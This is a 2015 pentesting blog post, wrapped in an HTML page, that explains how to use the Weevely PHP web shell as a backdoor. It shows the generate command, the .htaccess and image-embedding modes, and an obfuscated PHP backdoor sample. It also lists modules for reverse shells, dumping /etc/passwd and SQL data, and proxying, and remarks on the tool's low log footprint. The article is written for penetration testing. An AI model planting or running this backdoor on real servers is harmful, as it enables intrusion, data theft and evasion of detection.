@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Gwendal Le Coguic">
+    <meta name="description" content="Gwendal Le Coguic, developer, bug hunter, independent cybersecurity expert">
+    <meta name="keywords" content="developer,security,researcher,pentester,bugbounty,tools,bash,php,python,golang">
+
+    <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://glc.st/assets/img/header-background.jpg"/>
+
+<meta name="twitter:title" content="Weevely"/>
+<meta name="twitter:description" content="Weevely is a PHP command line web shell usually used as a backdoor while performing the post exploitation phase of a penetration test.
+By default in Kali Linux, the installed version 1.1 isn&rsquo;t supported anymore but version 3 is available on GitHub.
+Generate the backdoor:
+weevely generate.&lt;mode&gt; &lt;password&gt; &lt;path&gt;
+The password is optionnal but it&rsquo;s important to protect your customer from other users because an unwanted access can easily lead to a full access on the server with privileges escalation. There is three kinds of backdoor available but this functionnality seems to have been removed in version 3.
+
+htaccess: a single .htaccess file is created containing the malicious code and the right Apache directive so that all .htaccess files are considered as regular PHP script
+img: giving an existing image, Weevely will concatenate the binary datas and the malicious code, plus it also creates an .htaccess
+to tell Apache that the image should be considered as a regular PHP script (that means both files should be uploaded on the target server)
+php: this is the default, a single PHP script is generated
+"/>
+<meta name="twitter:site" content="@Gwendal Le Coguic"/>
+<meta name="twitter:creator" content="@gwendallecoguic"/>
+
+    <meta property="og:title" content="Weevely" />
+<meta property="og:description" content="Weevely is a PHP command line web shell usually used as a backdoor while performing the post exploitation phase of a penetration test.
+By default in Kali Linux, the installed version 1.1 isn&rsquo;t supported anymore but version 3 is available on GitHub.
+Generate the backdoor:
+weevely generate.&lt;mode&gt; &lt;password&gt; &lt;path&gt;
+The password is optionnal but it&rsquo;s important to protect your customer from other users because an unwanted access can easily lead to a full access on the server with privileges escalation. There is three kinds of backdoor available but this functionnality seems to have been removed in version 3.
+
+htaccess: a single .htaccess file is created containing the malicious code and the right Apache directive so that all .htaccess files are considered as regular PHP script
+img: giving an existing image, Weevely will concatenate the binary datas and the malicious code, plus it also creates an .htaccess
+to tell Apache that the image should be considered as a regular PHP script (that means both files should be uploaded on the target server)
+php: this is the default, a single PHP script is generated
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://glc.st/posts/weevely/" />
+
+<meta property="og:image" content="https://glc.st/assets/img/header-background.jpg" />
+<meta property="article:published_time" content="2015-02-19T00:00:00+00:00" />
+<meta property="article:modified_time" content="2015-02-19T00:00:00+00:00" /><meta property="og:site_name" content="Gwendal Le Coguic" />
+
+
+    
+      <base href="https://glc.st/posts/weevely/">
+    
+    <title>
+    Weevely · Gwendal Le Coguic
+</title>
+
+    
+      <link rel="canonical" href="https://glc.st/posts/weevely/">
+    
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.1/css/all.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
+
+    
+      
+      
+      <link rel="stylesheet" href="https://glc.st/assets/css/coder.min.3d8325016df2bf0f0e874e28c83131f668a953cb3245cf9391fae4ff5b76b2ed.css" integrity="sha256-PYMlAW3yvw8Oh04oyDEx9mipU8syRc&#43;Tkfrk/1t2su0=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+      <link rel="stylesheet" href="https://glc.st/assets/css/custom.css" />
+    
+
+    <link rel="icon" type="image/png" href="https://glc.st/assets/img/favicon-256x256.png" sizes="256x256">
+    <link rel="icon" type="image/png" href="https://glc.st/assets/img/favicon-128x128.png" sizes="128x128">
+    <link rel="icon" type="image/png" href="https://glc.st/assets/img/favicon-64x64.png" sizes="64x64">
+    <link rel="icon" type="image/png" href="https://glc.st/assets/img/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://glc.st/assets/img/favicon-16x16.png" sizes="16x16">
+
+    <meta name="generator" content="Hugo 0.125.7">
+  </head>
+
+  <body class=" ">
+        <main class="wrapper">
+      <nav class="navigation d-print-none">
+  <section class="container">
+    <a class="navigation-title" href="https://glc.st/">
+      Gwendal Le Coguic
+    </a>
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://glc.st/posts/">Posts</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://glc.st/projects/">Projects</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://glc.st/cves/">CVEs</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://glc.st/services/">Services</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://glc.st/press/">Press</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://glc.st/about/">About</a>
+          </li>
+        
+      
+      
+    </ul>
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+<section class="container post">
+    <div id="sharer">
+    <div class="sharer-buttons">
+
+        <a href="https://twitter.com/intent/tweet?text=Weevely%20https%3a%2f%2fglc.st%2fposts%2fweevely%2f" target="_blank"><img class="twitter" src="https://glc.st/assets/img/share/twitter.svg" alt="twitter"></a>
+        <a href="http://www.reddit.com/submit?url=https%3a%2f%2fglc.st%2fposts%2fweevely%2f&title=Weevely" target="_blank"><img class="reddit" src="https://glc.st/assets/img/share/reddit.svg" alt="reddit"></a>
+        <a href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fglc.st%2fposts%2fweevely%2f&amp;t=Weevely" target="_blank"><img class="hackernews" src="https://glc.st/assets/img/share/hackernews.svg" alt="hackernews"></a>
+        <a href="mailto:?subject=Weevely&body=https%3a%2f%2fglc.st%2fposts%2fweevely%2f" target="_blank"><img class="mail" src="https://glc.st/assets/img/share/mail.svg" alt="mail"></a>
+        <a href="https://wa.me/?text=Weevely%20https%3a%2f%2fglc.st%2fposts%2fweevely%2f" target="_blank"><img class="whatsapp" src="https://glc.st/assets/img/share/whatsapp.svg" alt="facebook"></a>
+        <a href="https://t.me/share/url?url=https%3a%2f%2fglc.st%2fposts%2fweevely%2f&text=Weevely" target="_blank"><img class="telegram" src="https://glc.st/assets/img/share/telegram.svg" alt="facebook"></a>
+        <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fglc.st%2fposts%2fweevely%2f&amp;title=Weevely" target="_blank"><img class="linkedin" src="https://glc.st/assets/img/share/linkedin.svg" alt="linkedin"></a>
+        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fglc.st%2fposts%2fweevely%2f&t=Weevely" target="_blank"><img class="facebook" src="https://glc.st/assets/img/share/facebook.svg" alt="facebook"></a>
+
+        
+    </div>
+</div>
+
+
+    <article>
+        <header>
+            <div class="post-title">
+                <h1 class="title">Weevely</h1>
+            </div>
+            <div class="post-meta">
+                <div class="date">
+                    <span class="posted-on">
+                        <i class="fas fa-calendar"></i>
+                        <time datetime='2015-02-19T00:00:00Z'>
+                            February 19, 2015
+                        </time>
+                    </span>
+                    <span class="reading-time">
+                        <i class="fas fa-clock"></i>
+                        3 minutes read
+                    </span>
+                </div>
+                
+                <div class="tags">
+  <i class="fas fa-tag"></i>
+    <a href="https://glc.st/tags/backdoor/">backdoor</a>
+      <span class="separator">•</span>
+    <a href="https://glc.st/tags/remote-command-execution/">remote command execution</a></div>
+
+            </div>
+        </header>
+
+        <div>
+            <p>Weevely is a PHP command line web shell usually used as a backdoor while performing the post exploitation phase of a penetration test.
+By default in Kali Linux, the installed version 1.1 isn&rsquo;t supported anymore but version 3 is available on <a href="https://github.com/epinna/weevely3" title="Weevely on GitHub">GitHub</a>.</p>
+<p>Generate the backdoor:</p>
+<p><code>weevely generate.&lt;mode&gt; &lt;password&gt; &lt;path&gt;</code></p>
+<p>The password is optionnal but it&rsquo;s important to protect your customer from other users because an unwanted access can easily lead to a full access on the server with privileges escalation. There is three kinds of backdoor available but this functionnality seems to have been removed in version 3.</p>
+<ul>
+<li><strong>htaccess</strong>: a single <code>.htaccess</code> file is created containing the malicious code and the right Apache directive so that all <code>.htaccess</code> files are considered as regular PHP script</li>
+<li><strong>img</strong>: giving an existing image, Weevely will concatenate the binary datas and the malicious code, plus it also creates an <code>.htaccess</code>
+to tell Apache that the image should be considered as a regular PHP script (that means both files should be uploaded on the target server)</li>
+<li><strong>php</strong>: this is the default, a single PHP script is generated</li>
+</ul>
+<p>Example:</p>
+<p><img src="https://glc.st/images/weevely-generate.png" alt="Weevely generate"></p>
+<p>A <code>sessions</code> directory has also been created to log every command.
+No matter what creation mode you choosed the obfuscated generated PHP code looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$ztqi <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;h&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;hshtrh_rhehphlhahche&#34;</span>);
+</span></span><span style="display:flex;"><span>$hule<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;am9pbihhcnJhehrV9zbGhrljZSgkYSwkhrYhrygkYhrSktMykpKShrkpO2VjaG8gJzwvJhry4kay4nhrPic7fQ==&#34;</span>;
+</span></span><span style="display:flex;"><span>$xhmv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PSdlcnRhr5JztlY2hvIhrCc8Jy4kay4nPihrc7ZXhrZhbChiYXNlNjRfZGVjbhr2RlKHBhryZWdfchrmVhrwbGFjZ&#34;</span>;
+</span></span><span style="display:flex;"><span>$ezko<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ShhcnJheSgnL1hrteXHc9XHNdLycsJy9chrcy8nKSwgYXJyYXkohrJyhrcshrJyhrsnKSwg&#34;</span>;
+</span></span><span style="display:flex;"><span>$kyjf<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;JGM9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYhrSk9PSdheicgJihrYgJGMoJGEpPjMpeyRr&#34;</span>;
+</span></span><span style="display:flex;"><span>$tjbu <span style="color:#f92672">=</span> $ztqi(<span style="color:#e6db74">&#34;g&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;basgeg6g4g_gdgegcgode&#34;</span>);
+</span></span><span style="display:flex;"><span>$plri <span style="color:#f92672">=</span> $ztqi(<span style="color:#e6db74">&#34;y&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;cyreyatye_yfuynycytyiyon&#34;</span>);
+</span></span><span style="display:flex;"><span>$pigj <span style="color:#f92672">=</span> $plri(<span style="color:#e6db74">&#39;&#39;</span>, $tjbu($ztqi(<span style="color:#e6db74">&#34;hr&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $kyjf<span style="color:#f92672">.</span>$xhmv<span style="color:#f92672">.</span>$ezko<span style="color:#f92672">.</span>$hule))); $pigj();
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>There is different ways to inject the backdoor on the target server: file upload, SQL injection and so on&hellip;
+Once you have infected your target, you can connect to the client with the password you choosed:</p>
+<p><img src="https://glc.st/images/weevely-connect.png" alt="Weevely connect"></p>
+<p>Running <code>:help </code>will display the list of all modules available or the detailed usage informations of the given module.</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>:audit.systemfiles</td>
+<td>Find wrong system files permissions</td>
+</tr>
+<tr>
+<td>:audit.phpconf</td>
+<td>Check php security configurations</td>
+</tr>
+<tr>
+<td>:audit.mapwebfiles</td>
+<td>Crawl and enumerate web folders files permissions</td>
+</tr>
+<tr>
+<td>:audit.userfiles</td>
+<td>Guess files with wrong permissions in users home folders</td>
+</tr>
+<tr>
+<td>:audit.etcpasswd</td>
+<td>Enumerate users and /etc/passwd content</td>
+</tr>
+<tr>
+<td>:shell.sh</td>
+<td>Execute system shell command</td>
+</tr>
+<tr>
+<td>:shell.php</td>
+<td>Execute PHP statement</td>
+</tr>
+<tr>
+<td>:system.info</td>
+<td>Collect system informations</td>
+</tr>
+<tr>
+<td>:backdoor.reversetcp</td>
+<td>Send reverse TCP shell</td>
+</tr>
+<tr>
+<td>:backdoor.tcp</td>
+<td>Open a shell on TCP port</td>
+</tr>
+<tr>
+<td>:bruteforce.sqlusers</td>
+<td>Bruteforce all SQL users</td>
+</tr>
+<tr>
+<td>:bruteforce.sql</td>
+<td>Bruteforce SQL username</td>
+</tr>
+<tr>
+<td>:file.edit</td>
+<td>Edit remote file</td>
+</tr>
+<tr>
+<td>:file.mount</td>
+<td>Mount remote filesystem using HTTPfs</td>
+</tr>
+<tr>
+<td>:file.webdownload</td>
+<td>Download web URL to remote filesystem</td>
+</tr>
+<tr>
+<td>:file.touch</td>
+<td>Change file timestamps</td>
+</tr>
+<tr>
+<td>:file.upload2web</td>
+<td>Upload binary/ascii file into remote web folders and guess corresponding url</td>
+</tr>
+<tr>
+<td>:file.download</td>
+<td>Download binary/ascii files from the remote filesystem</td>
+</tr>
+<tr>
+<td>:file.enum</td>
+<td>Enumerate remote paths</td>
+</tr>
+<tr>
+<td>:file.read</td>
+<td>Read remote file</td>
+</tr>
+<tr>
+<td>:file.upload</td>
+<td>Upload binary/ascii file into remote filesystem</td>
+</tr>
+<tr>
+<td>:file.check</td>
+<td>Check remote files type, md5 and permission</td>
+</tr>
+<tr>
+<td>:file.rm</td>
+<td>Remove remote files and folders</td>
+</tr>
+<tr>
+<td>:file.ls</td>
+<td>List directory contents</td>
+</tr>
+<tr>
+<td>:sql.console</td>
+<td>Run SQL console or execute single queries</td>
+</tr>
+<tr>
+<td>:sql.dump</td>
+<td>Get SQL database dump</td>
+</tr>
+<tr>
+<td>:net.phpproxy</td>
+<td>Install remote PHP proxy</td>
+</tr>
+<tr>
+<td>:net.ifaces</td>
+<td>Print interfaces addresses</td>
+</tr>
+<tr>
+<td>:net.scan</td>
+<td>Port scan open TCP ports</td>
+</tr>
+<tr>
+<td>:net.proxy</td>
+<td>Install and run Proxy to tunnel traffic through target</td>
+</tr>
+<tr>
+<td>:find.suidsgid</td>
+<td>Find files with superuser flags</td>
+</tr>
+<tr>
+<td>:find.name</td>
+<td>Find files with matching name</td>
+</tr>
+<tr>
+<td>:find.perms</td>
+<td>Find files with write, read, execute permissions</td>
+</tr>
+</tbody>
+</table>
+<p>Another good point for Weevely is the verbosity, the remote agent is very low footprint. Below my Apache logs after running some commands:</p>
+<p><img src="https://glc.st/images/weevely-traces.png" alt="Weevely traces"></p>
+<p>As you may notice the user-agent has also been randomized wich is usually a good idea&hellip;</p>
+<h2 id="external-resources">External resources</h2>
+<ul>
+<li><a href="https://glc.st/posts/introduction-to-pentesting/">Introduction to pentesting</a></li>
+</ul>
+        </div>
+
+        <footer>
+            
+
+
+        </footer>
+    </article>
+
+    
+</section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    
+    
+    
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+  
+    
+      
+    
+  
+
+
+
+    
+      <script src="https://glc.st/assets/js/scripts.js"></script>
+    
+
+  </body>
+
+</html>
